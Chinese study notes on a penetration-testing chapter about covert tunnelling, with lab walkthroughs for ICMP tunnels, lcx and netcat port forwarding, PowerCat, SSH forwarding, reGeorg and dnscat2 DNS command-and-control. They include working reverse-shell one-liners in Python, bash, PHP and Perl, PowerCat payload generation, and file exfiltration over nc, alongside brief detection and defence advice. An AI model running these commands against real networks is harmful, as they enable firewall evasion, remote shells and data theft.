# 【第三章】隐藏通信隧道技术

**隐藏通信隧道基础知识**

**隐藏通信隧道概述**

（**在实际的网络中，通常会通过各种边界设备、软/硬件防火墙甚至入侵检测系统来检查对外连接情况，如果发现异样，就会对通信进行阻断。那么什么是隧道呢？这里的隧道，就是一种绕过端口屏蔽的通信方式。防火墙两端的数据包通过防火墙所允许的数据包类型或端口进行封装，然后穿过防火墙，与对方进行通信。当封装的数据包到达目的地时，将数据包还原，并将还原后的数据包发送到相应服务器上。**）

各种边界设备、软/硬件防火墙甚至入侵检测系统来检查对外连接的情况，如果发现异常，就会对通信进行阻断。

隧道，就是一种绕过端口屏蔽的通信方式。

常用的隧道：

- 网络层：IPv6隧道、ICMP隧道、GRE隧道
- 传输层：TCP隧道、UDP隧道、常规端口转发
- 应用层：SSH隧道、HTTP隧道、HTTPS隧道、DNS隧道

**判读内网的连通性**

即**判断机器能否上外网**等。要综合判断各种协议（TCP、HTTP、HTTPS、DNS、ICMP等）及端口通信的情况。常见的允许流量出网的端口有80、8080、443、53、110、123等。常用的内网连通性判断方法如下：

- ICMP协议

```
执行命令"ping <IP地址或域名>"
```

- TCP协议

```
使用netcat工具，执行"nc <IP地址 端口号>"
或者
telnet <IP地址 端口号>
```

- HTTP协议

```
CURL下载：https://curl.se/download/
在使用curl时，需要执行"curl <ip地址:端口号>"命令。如果远程主机开启了相应的端口，会输出相应的端口信息；如果远程主机没有开通相应的端口，则没有任何提示。按"ctrl+c"键即可断开连接
```

- DNS协议

       在进行DNS连通性检测时，常用的命令为nslookup和dig

       nslookup是Windows操作系统自带的DNS探测命令。其用法如下：

```
nslookup www.baidu.com vps-ip
```

       dig是Linux默认自带的DNS探测命令。其用法如下：

```
dig @vps-ip www.baidu.com
```

- 还有一种情况是流量不能直接流出，需要在内网中设置代理服务器，常见于通过企业办公网段上网的场景。常用的判断方法如下：

        ①查看网络连接，判断是否存在与其他机器的8080（不绝对）等端口的连接（可以尝试运行“ping \-n 1 \-a ip”命令）

        ②查看内网中 是否有主机名类似于"proxy"的机器

        ③查看IE浏览器的直接代理

        ④根据pac文件的路径（可能是本地路径，也可能是远程路径），将其下载下来并查看

        ⑤执行如下命令，利用curl工具进行确认

```
curl www.baidu.com             //不通
curl -x proxy-ip:port www.baidu.com     //通
```

**网络层隧道技术**

在网络层两个常用的隧道协议是IPv6和ICMP

**IPv6隧道**

- IPv6隧道技术是指通过IPv4隧道传送IPv6数据报文的技术。
- 现阶段的边界设备、防火墙甚至入侵防御系统 还无法识别 IPv6 的通信数据，而大多数的操作系统支持 IPv6 ，所以需要进行人工配置。

        ![2c4f30f487beba16e3b9494b8c2e0cce.png](image/2c4f30f487beba16e3b9494b8c2e0cce.png)

- 攻击者有时会通过恶意软件来配置允许进行 IPv6 通信的设备，以避开防火墙和入侵检测系统
- 支持 IPv6 的隧道工具有 socat、6tunnel、nt6tunnel 等。
- 针对IPv6隧道攻击，最好的防御方法是：了解IPv6的具体漏洞，结合其他协议，通过防火墙和深度防御系统过滤IPv6通信，提高主机和应用程序的安全性。

**ICMP隧道**

ICMP是一个比较特殊的协议，**在一般通信协议中，如果两台设备要进行通信，肯定要开放端口，而ICMP协议下就不需要**。最常见的 ICMP 协议的消息为 ping 命令的回复，攻击者可以利用命令行得到比回复更多的 ICMP 请求。

**在一些网络环境中，如果攻击者使用各类上层隧道（例如HTTP隧道、DNS隧道、常规端口转发等）进行的操作都失败了，常常会通过ping命令访问远程计算机，尝试建立ICMP隧道，将TCP/UDP数据封装到ICMP的ping数据包中，从而穿过防火墙（通常防火墙不会屏蔽ping数据包），实现不受限制的网络访问**

常用的ICMP隧道工具有icmpsh、PingTunnel、icmptunnel、powershell icmp等

- icmpsh

       icmpsh可以跨平台，且不需要管理员权限

       安装：

```
git clone https://github.com/inquisb/icmpsh.git #下载工具
apt-get install python-impacket #安装依赖

sysctl -w net.ipv4.icmp_echo_ignore_all=1  #关闭本地ICMP应答 ： 因为icmpsh工具要代替系统本身的ping命令的应答程序
(结束后别忘了再开启。sysctl -w net.ipv4.icmp_echo_ignore_all=0  )
```

      使用：

      服务器：①输入"./run.sh"并运行，会提示输入目标的IP地址（目标主机的公网IP地址）。因为我们是在虚拟机中进行演示，输入"192.168.111.156"，并回车，会自动给出需要在目标主机上运行的命令并

      开启监听。 ②或者  输入 "python icmpsh\_m.py 192.168.43.132（攻击者） 192.168.43.74（目标主机）"

      ![1b88331b9f54a522c1b8b29479163912.png](image/1b88331b9f54a522c1b8b29479163912.png)

      目标主机：

      运行 icmpsh.exe \-t 192.168.111.132（攻击者）\-d 500 \-b 30 \-s 128

      ![ca3bf5fb4fb6dd6b5dc9048ae048ad08.png](image/ca3bf5fb4fb6dd6b5dc9048ae048ad08.png)

      即可在攻击机上看到shell:

      ![43a53dca0431d8d93f1d596f9388e6dc.png](image/43a53dca0431d8d93f1d596f9388e6dc.png)

- PingTunnel

       PingTunnel也是一个常用的ICMP隧道工具，可以跨平台，在使用时可以给隧道设置密码，从而防止隧道被滥用。

       测试环境:    

      ![922b8fd274215c71c8cb15187bead770.png](image/922b8fd274215c71c8cb15187bead770.png)

      攻击机可以访问web服务器，不能访问数据库服务器

      web服务器无法直接访问数据库服务器，但可以通过ping命令访问数据库服务器

      测试目标：利用工具使攻击机可以访问数据库服务器的3389

      

      首先，在需要建立ICMP隧道的两台机器（攻击机、Web服务器\)上安装PingTunnel工具，下载 [http://freshmeat.sourceforge.net/projects/ptunnel/](http://freshmeat.sourceforge.net/projects/ptunnel/)

      然后输入如下命令，解压、配置、编译：

```
wget http://www.cs.uit.no/~daniels/PingTunnel/PingTunnel-0.72.tar.gz 
tar -xzvf PingTunnel-0.72.tar.gz 
cd PingTunnel 
make && make install
```

     ![d758587ad5166c0dd9a2c449ca507a87.png](image/d758587ad5166c0dd9a2c449ca507a87.png)

     如果报pcap.h缺失,，则需要安装libpcap（数据包捕获函数库），用于捕捉经过指定网络端口的数据包。在Windows平台上，类似的库叫做wincap。

```
wget http://www.tcpdump.org/release/libpcap-1.9.0.tar.gz 
tar -zxvf libpcap-1.9.0.tar.gz 
cd libpcap-1.9.0 
./configure
```

    安装过程是，如果提示yacc包错误

   ![d2a68269a5b9b0e43cbfcf60dc83417b.png](image/d2a68269a5b9b0e43cbfcf60dc83417b.png)

   则输入如下命令，安装yacc

```
apt-get install -y byacc
然后依次输入
./configure
make
sudo make install
```

    回到pingtunnel目录重新执行

```
make & make install
```

    ![3ab3b71fb716393721d3114562ffa902.png](image/3ab3b71fb716393721d3114562ffa902.png)

    安装完成

    

     下面介绍PingTunnel工具的使用方法

```
-x   指定ICMP隧道连接的验证密码
-lp  指定要监听的本地TCP端口
-da  指定要转发的目标机器的IP地址
-dp  指定要转发的目标机器的TCP端口
-p   指定ICMP隧道另一端的机器的IP地址
```

     在Web服务器，运行pingtunnel，开启隧道

```
ptunnel -x haixian
```

![7cf0a981e8c33d4eef81869026985595.png](image/7cf0a981e8c33d4eef81869026985595.png)

     在攻击机上执行命令：

```
ptunnel -p 192.168.1.5 -lp 1080 -da 192.168.1.2 -dp 3389 -x haixian
```

![dee0339e473f5f1c56968f61756e67f6.png](image/dee0339e473f5f1c56968f61756e67f6.png)

      这条命令的意思是，当访问攻击机192.168.1.4的1080端口时，会把数据库服务器192.168.1.2的3389端口的数据封装在ICMP隧道里，以Web服务器192.168.1.5为ICMP隧道跳板进行传送。

       接下来访问攻击机的1080端口便可以连接到数据库服务器192.168.1.2的远程桌面了\(3389\)

![008b4f07d3cb9e64f453bf183b5ee3f7.png](image/008b4f07d3cb9e64f453bf183b5ee3f7.png)

![e70b94918b80e7c266ea4b97fc8c7265.png](image/e70b94918b80e7c266ea4b97fc8c7265.png)

\(PS ：PingTunnel工具在Windows环境中也可以使用，只不过需要在内网的Windows机器上安装wincap类库）

- 防御ICMP隧道攻击的方法

       wireshark抓包，进行ICMP数据包分析，检测恶意ICMP流量：1、一个正常的ping命令每秒最多发送两个数据包，而使用ICMP隧道的浏览器会在很短时间内产生上千个ICMP数据包。2、 注意payload大于64bit的ICMP数据包。3、注意请求数据包payload和响应数据包中的payload不一样的ICMP数据包。4、检测ICMP数据包的协议标签。例如，icmptunnel会在所有ICMP payload前面添加“TUNL”标记来标识隧道。

**传输层隧道技术**

传输层技术包括TCP隧道、UDP隧道和常规端口转发。在渗透测试中，如果内网防火墙阻止了对指定端口的访问，在获得目标机器的权限后，可以使用IPTABLES打开指定端口。如果内网中存在一系列防御系统，TCP、UDP流量会被大量拦截

**lcx端口转发**

lcx是一个基于Socket套接字实现的端口转发工具，一个正常的Socket隧道必须具备两端：客户端、服务端，服务端开启监听端口，客户端传入服务端的IP与端口，主动与服务端连接

- 内网端口转发

       在目标机器上执行如下命令，将目标机器3389端口的所有数据转发到公网VPS的4444端口上

```
lcx.exe -slave VPS-ip 4444 127.0.0.1 3389
```

       在VPS上执行如下命令，将本机4444端口上监听的所有数据转发到本机的5555端口上

```
lcx.exe -listen 4444 5555
```

       此时，用mstsc登录 VPS\-ip:5555 即可访问目标服务器的3389端口

- 本地端口映射

       在目标主机上执行如下命令，就可以执行从远程桌面连接目标主机的53端口

```
lcx -tran 53 <目标主机IP地址> 3389
```

**netcat**

netcat从网络的一端读取数据，输出到网络的另一端\(可以使用TCP和UDP协议\)

- 安装

```
wget http://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz/download -O netcat-0.7.1.tar.gz
tar -zxvf netcat-0.7.1.tar.gz
ca netcat-0.7.1
./configure
make
```

- 简易使用

① banner抓取

```
nc -nv 192.168.111.157 80
```

②连接远程主机

```
nc -nvv 192.168.111.156 80
```

③端口扫描

```
nc -v 192.168.111.156 80
nc -v -z 192.168.111.156 20-100     (扫描速度很慢）
```

![b4c6b92a247c1436f3600007f17c66fb.png](image/b4c6b92a247c1436f3600007f17c66fb.png)

④端口监听

```
监听本地端口，当访问该端口时会输出该信息到命令行
nc -l -p 9999
```

![cf3c8f6b5545bfa38d1842b6dcf4aa61.png](image/cf3c8f6b5545bfa38d1842b6dcf4aa61.png)

⑤文件传输

在本地VPS主机中输入如下命令，开始监听，等待连接。一旦连接建立，数据便会流入

```
nc -lp 333 > 1.txt
```

在目标主机中输入如下命令，与VPS的333端口建立连接，并传输一个名为test.txt的文本文件

```
nc -vn 192.168.1.4 333 < test.txt -q 1
```

传输完成，在VPS中打开1.txt文件，可以看到数据已经传送过来。

- **获取shell**

       Shell分为两种，一种是正向shell，另一种是反向shell。如果客户端连接服务器，客户端想要获取服务器的shell，就称为正向shell；**如果客户端连接服务器，服务器想要获得客户端的shell，就称为反向shell**。反向shell通常用在开启了防护措施的目标机器上，例如防火墙过滤、端口转发等。

       ①正向shell

目标主机：

```
nc -lvvp 8899 -e /bin/sh                                                        #linux
nc -lvvp 8899 -e c:\windows\system32\cmd.exe                  #windows
```

攻击机：

```
nc <目标主机IP> 8899
```

![0168449e0d168164e5f1a84244153f85.png](image/0168449e0d168164e5f1a84244153f85.png)

        ②反向shell

攻击机：

```
nc -lvvp 8889
```

目标主机：

```
nc <目标主机IP> 8899 -e /bin/sh     
nc <目标主机IP> 8899 -e c:\windows\system32\cmd.exe                  #windows
```

- 在目标主机中没有nc时获取反向shell

攻击机均使用netcat进行监听：

```
nc -lvvp 4433
```

①python反向shell

```
python2 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.86.131",4433));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

②bash反向shell

```
bash -i >& /dev/tcp/192.168.86.131/4433 0>&1
```

③PHP反向shell

```
php -r '$sock=fsockopen("192.168.86.131",4433);exec("/bin/sh -i <&3 >&3 2>&3");'
```

④Perl反向shell

```
perl -e 'use Socket;$i="192.168.86.131";$p=4433;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

- **内网代理**

测试环境：攻击机可以访问到web服务器，但访问不到数据库服务器，web服务器可以访问攻击机，也可以访问数据库服务器，攻击机无法直接访问数据库服务器，通过前期渗透已经取得了web服务器的权限

![0f43e81c8cdc2dd85c3662a6c5ec2824.png](image/0f43e81c8cdc2dd85c3662a6c5ec2824.png)

首先在攻击机上执行命令监听本机9999端口

```
nc -lvvp 9999
```

![a8019ccd90589b11b55febb8cbcbf875.png](image/a8019ccd90589b11b55febb8cbcbf875.png)

然后在数据库服务器中执行

```
nc -lvp 9999 -e c:\windows\system32\cmd.exe
```

最后在web服务器\(跳板机\)中执行

```
nc -v 192.168.1.4 9999 -c "nc -v 192.168.1.2 9999"
```

![12dc8ee34e1952dfc2024b769ea8c30f.png](image/12dc8ee34e1952dfc2024b769ea8c30f.png)

可见在攻击机中收到了来自数据包库服务器的反弹shell

![7f2d1167932962b07e9f0bb354cc858c.png](image/7f2d1167932962b07e9f0bb354cc858c.png)

**PowerCat**

PowerCat可以说是netcat的powershell版本。它可以通过执行命令回到本地运行，也可以使用远程权限运行。

- 下载PowerCat

```
git clone https://github.com/besimorhino/powercat.git
```

       在powershell命令行环境中，要想使用powercat.ps1脚本，必须先进行导入操作

```
Import-Module .\powercat.ps1
```

![457482bcef71ec5defd2eab0014847f4.png](image/457482bcef71ec5defd2eab0014847f4.png)

       导入之后，输入"powercat \-h" ，可以看到帮助信息

- 通过nc正向连接PowerCat

在win10上执行监听命令"powercat \-l \-p 4455 \-e cmd.exe \-v" ， \-e指定要启动进程的名称

![7fa799de8111f40cd78cf4470ad96062.png](image/7fa799de8111f40cd78cf4470ad96062.png)

在Linux上执行"nc 192.168.111.156 4455 \-vv"

![a23c474cb70b58e0a663d2560509fa57.png](image/a23c474cb70b58e0a663d2560509fa57.png)

- 通过nc反向连接powercat

在Linux上执行

```
nc -lvvp 8888
```

在win10中使用\-c参数用于提供想要链接的IP地址，具体命令如下：

```
powercat -c 192.168.111.157 -p 8888 -v -e cmd.exe
```

- 通过powercat返回powershell

如果想返回powershell,则无法与nc进行交互。下面使用win7\(192.168.111.130\)与win10\(192.168.111.156\)进行建立正向连接

win10开启监听 "powercat \-l \-p 4443 \-v"

win7 执行如下命令，\-ep参数用于返回powershell

```
powercat -c 192.168.111.156 -p 4443 -v -ep
```

![95e0fe168eabce31b933b628860e7889.png](image/95e0fe168eabce31b933b628860e7889.png)

之后返回win10：

![9ed8f0ca69386c6a99f27546a149af1f.png](image/9ed8f0ca69386c6a99f27546a149af1f.png)

- 通过powercat传输文件

在win7中新建一个test.txt文件，将其放在C盘根目录。

在win10中执行如下命令

```
powercat -l -p 9999 -of test.txt -v
```

在win7中执行

```
powercat -c 192.168.111.156 -p 9999 -i c:\test.txt -v
```

\-i : 输入，可以写文件名，也可以写字符串

\-of : 输出文件名，可以在文件名前添加路径

即使文件传输完毕，连接也不会自动断开。在win7中，可以在文件末尾追加需要的内容，若不需要追加，可以按”ctrl\+c"断开连接。

- 用powercat生成payload

用powercat生成payload也有正向和反向之分，且可以对其进行编码。

在win10中执行如下命令

```
powercat -l -p 8000 -e cmd -v -g >> shell.ps1
```

将生成的ps1文件上传到win7执行，然后在win10中执行如下命令，就可以获得一个反弹shell

```
powercat -c 192.168.111.130 -p 8000 -v
```

![e496ecf33e8dec2d321c844cbac0dbed.png](image/e496ecf33e8dec2d321c844cbac0dbed.png)

![9a996b21b7b9d822e13a708de6fef968.png](image/9a996b21b7b9d822e13a708de6fef968.png)

如果想反弹powershell，可以执行如下命令

```
powercat -l -p 8000 -ep -v -g >> shell.ps1
```

用powercat也可以直接生成经过编码的payload：

在win10中执行如下命令，即可得到经过编码的payload

```
powercat -c 192.168.111.156 -p 8989 -ep -ge
```

![3c3ead66d33172a232e20c5d7f27908c.png](image/3c3ead66d33172a232e20c5d7f27908c.png)

继续在win10中执行命令"powercat \-l \-p 8989 \-v" ，并复制payload到win7中执行：

![12fee26570022624bbc37ee3e78d8c71.png](image/12fee26570022624bbc37ee3e78d8c71.png)

![900aedb3137bb5839ba532a86eb62e8d.png](image/900aedb3137bb5839ba532a86eb62e8d.png)

\-g : 生成payload

\-ge ：生成经过编码的payload，可以直接使用"powershell \-e \<编码\> " 命令执行。

- PowerCat DNS隧道通信

PowerCat也是一套基于DNS通信的协议，基于dnscat设计（其服务端酒店dnscat）。

安装dnscat:

```
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
gem install bundler
bundle install
```

然后，在安装了dnscat的Linux主机上执行如下命令：

```
ruby dnscat2.rb ttpowercat.test -e open --no-cache
```

![7c13a036fac952534bd7d6152940d271.png](image/7c13a036fac952534bd7d6152940d271.png)

执行以上命令后，在win7主机执行如下命令，就可以看到dnscat上反弹的shell了

```
powercat -c 192.168.111.157 -p 53 -dns ttpowercat.test -e cmd.exe
```

![3813b6513482e92c9193949f1c4b74a2.png](image/3813b6513482e92c9193949f1c4b74a2.png)

![8e770bd024148a9016749049401616f2.png](image/8e770bd024148a9016749049401616f2.png)

- 将powercat作为跳板

测试环境为：三台主机，其中win10（192.168.111.156）可以通过ping命令访问win7（192.168.111.130）和kali（192.168.111.157），kali和win7之间无法通过网络连接。

测试目标为：将win10作为跳板，让kali连接win7

方法①：

首先，win7执行：

```
powercat -l -v -p 9999 -e cmd.exe
```

然后win10执行

```
powercat -l -v -p 8000 -r tcp:192.168.111.130:9999       #-r 参数 用于在两个节点之间中继网络流量
```

最后让kali与win10连接，这样win10就可以将流量转发给win7主机了。

```
nc 192.168.111.156 8000 -vv
```

![f67eab11ebd36c5532670614269212c7.png](image/f67eab11ebd36c5532670614269212c7.png)

![0135140a1f5a0b5667b4cf8fa1b64cc2.png](image/0135140a1f5a0b5667b4cf8fa1b64cc2.png)

![28eeb14027180c047603ebb252bd9d04.png](image/28eeb14027180c047603ebb252bd9d04.png)

方法②：

在这里也可以使用DNS协议

win10

```
powercat -l -p 8000 -r dns::192.168.111.157::ttpowercat.test
```

kali,启动dnscat

```
ruby dnscat2.rb ttpowercat.test -e open --no-cache
```

最后在win7中执行以下命令，就可以看到反弹shell了

```
powercat -c 192.168.111.156 -p 8000 -v -e cmd.exe
```

**应用层隧道技术**

应用层隧道通信技术主要利用应用软件提供的端口来发送数据。常用的隧道协议有SSH、HTTP/HTTPS和DNS。

**SSH协议**

SSH协议是被允许通过防火墙和边界设备的。SSH协议在传输过程中是加密的，所以我们很难区分合法的SSH会话和攻击者利用其他网络建立的隧道。攻击者使用SSH端口隧道突破防火墙的限制后，能够建立一些之前无法建立的TCP连接。

```
ssh root@192.168.1.1
常用参数：
-C 压缩传输 
-f 后台执行SSH 
-N 建立静默连接 
-g 允许远程主机连接本地用于转发的端口 
-L 本地端口转发 
-R 远程端口转发 
-D 动态转发 
-P 指定SSH端口
```

- 本地转发

测试环境：攻击机可以访问到web服务器，但访问不到数据库服务器，web服务器可以访问攻击机，也可以访问数据库服务器，攻击机无法直接访问数据库服务器，通过前期渗透已经取得了web服务器的权限

![0f43e81c8cdc2dd85c3662a6c5ec2824.png](image/0f43e81c8cdc2dd85c3662a6c5ec2824.png)

测试目标：以Web服务器为跳板，访问数据库服务器的3389端口

**首先在攻击机上执行**

```
ssh -CfNg -L 2021(VPS端口):192.168.1.2(目标主机):3389(目标端口) root@192.168.1.5(跳板机)
```

这条命令的意思就是攻击机去连接web服务器，连上之后由web服务器去连接数据库服务器的3389端口并把数据通过SSH通道传给攻击机

![6f4e8e3030e82305d2eb4a6b42c4c1dc.png](image/6f4e8e3030e82305d2eb4a6b42c4c1dc.png)

会提示输入web服务器的密码，输入密码

由于我们选择的是静默模式，所以可以本地查看一下2021端口是否被监听来检查通道的建立是否正常

```
netstat -tulnp | grep "2021"
```

![38e31c25de20fba86d4020ce48d2ef99.png](image/38e31c25de20fba86d4020ce48d2ef99.png)

可以看到2021端口正在被ssh服务监听，证明通道搭建成功

接下来在攻击机访问把本地2021端口即可打开数据库服务器的远程桌面

```
rdesktop 127.0.0.1:2021
```

![7d78630f51a8b391c7521a7fe0497ced.png](image/7d78630f51a8b391c7521a7fe0497ced.png)

SSH进程的本地端口映射可以将本地\(客户机\)的某个端口转发到远端指定机器的指定端口；本地端口转发则是在本地\(客户机\)监听一个端口，所有访问这个端口的数据都会通过SSH隧道传输到远端的对应端口

- 远程转发

实验环境：**攻击机无法访问数据库服务器，也无法访问web服务器但已获得web服务器的权限**，web服务器和数据库服务器可以互相访问，web服务器可以访问具有公网IP的攻击机

![0e1f325770fc7ae89ac0af96e83188d8.png](image/0e1f325770fc7ae89ac0af96e83188d8.png)

实验目标：通过访问攻击机本机的7890端口来访问数据库服务器的3389端口

在web服务器（192.168.1.5）上执行

```
ssh -CfNg -R 7890(VPS端口):192.168.1.2(目标主机):3389(目标端口) root@192.168.1.4(VPS主机)
```

这条命令的意思是此时的web服务器虽然依旧是跳板，但是**无论是连接数据库服务器的3389还是去连接攻击机的7890都是web服务器主动发起**

![97e38ef27031c346cbbfdb295e7fc2fe.png](image/97e38ef27031c346cbbfdb295e7fc2fe.png)

输入攻击机的密码

在攻击机访问本地7890端口

```
rdesktop 127.0.0.1:7890
```

![d48cdf7ee4be5ecf4d90774a4a4b0c4e.png](image/d48cdf7ee4be5ecf4d90774a4a4b0c4e.png)

**本地转发是将远程主机\(服务器\)某个端口的数据转发到本地机器的指定端口。远程端口转发则是在远程主机上监听一个端口，所有访问远程服务器指定端口的数据都会通过SSH隧道传输到本地的对应端口。**

- 动态转发

![5676b8f9c2c0604dfbd49b018c4a3445.png](image/5676b8f9c2c0604dfbd49b018c4a3445.png)

在攻击机上执行

```
ssh -CfNg -D 6000 root@192.168.1.5
```

此条命令搭建了一个**动态的SOCKS代理通道**

输入web服务器密码后执行

```
netstat -tulnp | grep ":6000"
```

查看连接情况

![f30462763a4ce4d820d442447a284e65.png](image/f30462763a4ce4d820d442447a284e65.png)

可以看到，在使用动态映射时，本地主机的SSH进程正在监听6000端口。

**动态端口映射就是建立一个SSH加密的SOCKS4/5代理通道。**任何支持SOCKS/5协议的程序都可以使用跟这个加密通道进行代理访问。

在本地浏览器设置好SOCKS代理后可以访问到数据库服务器上开放的web服务

![92e3c660c4c3dd91847ff9473bbf11f3.png](image/92e3c660c4c3dd91847ff9473bbf11f3.png)

![2fe9ff2cef6fff3ac15d99eea250bc58.png](image/2fe9ff2cef6fff3ac15d99eea250bc58.png)

- 防御SSH隧道攻击的思路

       SSH隧道之所以能被攻击者利用，主要是因为系统访问控制措施不够。在系统中配置SSH远程管理白名单，在ACL中限制只有特定的IP地址才能连接SSH，以及设置系统完全使用带外管理等方法，都可以避免这一问题。

       如果没有足够的资源来建立带外管理的网络结构，在内网中至少要限制SSH远程登录的地址和双向访问控制策略（从外部到内部；从内部到外部）

**HTTP/HTTPS协议**

HTTP Service代理用于将所有流量转发到内网。常见的代理工具有reGeorg、meterpreter、tunna等

reGeorg的主要功能是把内网服务器端口的数据通过HTTP/HTTPS隧道转发到本地。

reGeorg脚本的特征非常明显，很多杀毒软件都会对其进行查杀。

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

该文件下支持php，ashx，asp，jsp，aspx

操作步骤：

根据服务器支持语言，选择脚本\(如tunnel.jsp\)上传到服务器端，访问显示“Georg says, 'All seems fine'”，表示脚本运行正常。

运行命令：

```
python2 reGeorgSocksProxy.py -p 9999 -u http://url:8080/tunnel/tunnel.jsp
```

运行reGeorg监听9999端口，程序卡在“Georg says, 'All seems fine'”表示正常运行。

![d2e04b5cd76b309a546ce8070d3cf1b7.png](image/d2e04b5cd76b309a546ce8070d3cf1b7.png)

隧道正常工作之后，可以通过proxychains、proxifier等工具，访问目标内网中的资源。

**DNS协议    P131**

       DNS协议是一种请求/应答协议，也是一种可用于应用层的隧道技术。虽然激增的DNS流量可能会被发现，但基于传统Socket隧道已经濒临淘汰以及TCP、UDP通信大量被防御系统拦截的状况，**DNS、 ICMP、HTTP/HTTPS**等难以被禁用的协议以及成功攻击者控制隧道的组合渠道。

       一方面，在网络世界中，DNS流量是一个必不可少的服务；另一方面，DNS报文本身具有穿透防火墙的能力。由于**防火墙和入侵检测设备大都不会过滤DNS流量**，也为DNS成为隐蔽信道创造了条件。越来越多的研究证明，**DNS隧道在僵尸网络和APT攻击中扮演着重要的角色**。

       用于管理僵尸网络和进行APT攻击的服务器叫做C&C服务器\(Command and Control Server，命令及控制服务器\)。C&C节点分为两种，分别是C&C服务端\(攻击者\)和C&C客户端\(被控制的计算机\)。C&C通信是指植入C&C客户端的木马或者后门程序与C&C服务端上的远程控制程序之间的通信。

       **DNS隧道的工作原理**很简单：在进行DNS查询时，如果查询的域名不在DNS服务器本机的缓存中，就会访问互联网进行查询，然后返回结果。如果在**互联网上有一台定制的服务器**，那么依靠DNS协议即可进行数据包的交换。从DNS协议的角度看，这样的操作只是在一次次查询某个特定的域名并得到解析结果，但其本质问题是，预期的返回结果应该是一个IP地址，而事实上不是——**返回的可以是任意字符串，包括加密的C&C指令。**

      **域名型DNS隧道木马的通信架构**

     ![7618a9e785ddc6ff2748cf485547fa7a.png](image/7618a9e785ddc6ff2748cf485547fa7a.png)

       这里我们假设我们部署的是中继DNS隧道，首先我们的被控制器要查询xxx.[xxx.](http://xxx.com/)xxx\(黑客故意构造的域名\)，当本地缓存不存在这个域名时，它将前往DNS服务器节点查询，然后DNS服务器在我们自己伪装的DNS服务器上查询到域名地址对应的IP，那么我们就可以**封装加密的C&C指令传输到被控端**上。因为各大厂家为了不影响服务的运行，都不会将DNS服务屏蔽，因此这个方式是既隐秘又实用的方式。

       在使用DNS隧道与外部进行通信时，从表面上看是没有连接外网的\(内网网关没有转发IP数据包\)，但实际上，**内网的DNS服务器进行了中转操作**。这就是DNS隧道的工作原理，简单地说，就是将其他协议封装在DNS协议中进行传输。

- 查看DNS的连通性

首先，需要知道**当前服务器是否允许通过内部DNS解析外部域名**，也就是要测试DNS的连通性。

输入如下命令，查询当前内部域名及IP地址

```
cat /etc/resolv.conf|grep -v '#'
```

![d0a20cf75d0556c06118205d0c9254f5.png](image/d0a20cf75d0556c06118205d0c9254f5.png)

输入如下命令，查看能否与内部DNS通信。可以看到，能够解析内部域名

```
nslookup yokan.com
```

![db4acf231d8b432db40d1f3cde108042.png](image/db4acf231d8b432db40d1f3cde108042.png)

输入如下命令，查询能否通过内部DNS服务器解析外部域名。可以看到，能够通过内部DNS服务器解析外部域名，这意味着可以使用DNS隧道实现隐蔽通信

```
nslookup baidu.com
```

![0ae71803d350def9201a59a738b31759.png](image/0ae71803d350def9201a59a738b31759.png)

- **dnscat2**

       下载：[https://github.com/iagox86/dnscat2](https://github.com/iagox86/dnscat2)

       dnscat2使用DNS协议创建加密的C&C通道，通过预共享密钥进行身份验证；使用shell及DNS查询类型\(TXT MX CNAME A AAAA\),多个同时进行的会话类似于SSH中的隧道。严格来讲，dnscat2是命令与控制工具。

       使用dnscat2隧道的模式有两种：

       i  直连模式 ：客户端直接向指定IP地址的DNS服务器发起DNS解析请求

       ii 中继模式： DNS经过互联网的迭代解析，指向指定的DNS服务器。 速度较慢。

       如果目标内网放行**所有的DNS请求**，dnscat2会使用**直连模式**，通过**UDP**的**53**端口进行通信（不需要域名，速度快，而且看上去仍然像普通的DNS查询）。在请求日志中，所有的域名都是以"dnscat"开头的，因此**防火墙可以很容易地将直连模式的通信检测**出来。

       如果目标内网中的**请求仅限于白名单服务器或者特定的域**，dnscat2会使用**中继模式**来申请一个域名，并将运行**dnscat2服务端**的服务器指定为**受信任的DNS服务器**。

       在网络安全攻防演练中，DNS隧道的应用场景如下：在安全策略严格的内网环境中，**常见的C&C通信端口会被众多安全设备所监控**，Red Team对目标内网的终端进行渗透测试，发现该网段**只允许白名单流量出站，同时其他端口都被屏蔽**，传统的C&C通信无法建立。在这样的情况下，一般会使用DNS隐藏隧道建立通信。

       dnscat2通过DNS进行控制并执行命令，具有如下特点：

```
支持多个会话
流量加密
使用密钥防止MiTM攻击
在内存中直接执行powershell脚本
隐蔽通信
```

      1、部署域名解析 

在一台外网VPS服务器上安装Linux操作系统\(作为C&C服务器），并提供一个可以配置的域名。

首先，创建记录A，将自己的域名解析服务器\(ns.safebooks.\[domain\]\)指向VPS服务器\(1\*\*.\*\*\*.\*\*\*.\*\*\*\)，然后，创建NS记录，将dnsch子域名的解析结构指向ns.safebooks.\[domain\]

![fab622c925eef1bb7391ccaf5a943fad.png](image/fab622c925eef1bb7391ccaf5a943fad.png)

第二行A类型的解析结果是：告诉域名服务器ns1.yokan.\*\*\*地址为1\*\*.\*\*\*.\*\*\*.\*\*\* 。第七行NS类型的解析结果是：告诉域名服务器c\*\*.yokan.\*\*\*的地址为ns1.yokan.\*\*\*。

为什么要设置NS类型的记录？因为**NS类型**的记录不是用于设置某个域名的DNS服务器的，而**是用于设置某个子域名的DNS服务器**的。

前面提到过，在进行DNS查询时，会查找本地TCP/IP参数中设置的首先DNS服务器（在此称为本地DNS服务器）。当该服务器收到查询请求（例如，请求a.ms08067.com\)时，有如下两种情况：

       a）如果该域名在本地配置区域资源中，则将解析结果返回客户机，完成域名解析。

